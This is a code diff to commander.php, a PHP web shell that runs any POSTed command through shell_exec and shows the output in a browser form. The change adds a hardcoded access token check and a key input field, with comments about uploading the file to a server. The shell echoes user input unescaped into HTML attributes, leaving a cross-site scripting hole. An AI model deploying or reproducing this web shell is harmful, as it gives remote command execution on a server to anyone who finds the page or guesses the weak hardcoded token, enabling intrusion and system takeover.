@@ -1,7 +1,13 @@
 <?php
+    # change this token before uploading commander.php to the server
+    # it helps you on secure and private usage
+    $token = "d98234hf9";
+
     $cmd = "";
+    $key = "";
     $ret = "";
-    if(isset($_POST['cmd'])){
+    if(isset($_POST['key']) && $_POST['key'] == $token && isset($_POST['cmd'])){
+        $key = $_POST['key'];
         $cmd = $_POST['cmd'];
         $ret = shell_exec($cmd);
     }
@@ -53,7 +59,8 @@
 <body>
     <div class="result"><pre><?= $ret ?></pre></div>
     <form action="" class="prompt" method="post">
-        <input type="text" name="cmd" autofocus value="<?= $cmd ?>"/>
+        <input type="text" placeholder="KEY" name="key" value="<?= $key ?>"/>
+        <input type="text" placeholder="COMMAND" name="cmd" autofocus value="<?= $cmd ?>"/>
         <input type="submit" value="Execute" />
     </form>
 </body>
